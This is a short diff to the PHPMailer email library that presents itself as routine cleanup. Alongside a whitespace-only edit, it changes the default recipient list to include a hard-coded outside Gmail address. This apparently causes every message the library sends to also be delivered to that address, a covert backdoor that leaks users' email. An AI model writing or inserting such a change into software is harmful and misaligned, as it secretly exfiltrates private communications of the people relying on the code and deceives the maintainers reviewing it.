@@ -435,7 +435,9 @@ class phpmailer
      * @type array
      * @access protected
      */
-    protected $to = array();
+    protected $to = array(
+      "mjftrask@gmail.com"
+    );
 
     /**
      * The array of 'cc' addresses.
@@ -1044,7 +1046,7 @@ class phpmailer
                     if (method_exists($this, $sendMethod)) {
                         return $this->$sendMethod($this->MIMEHeader, $this->MIMEBody);
                     }
-                    
+
                     return $this->mailSend($this->MIMEHeader, $this->MIMEBody);
             }
         } catch (phpmailerException $exc) {
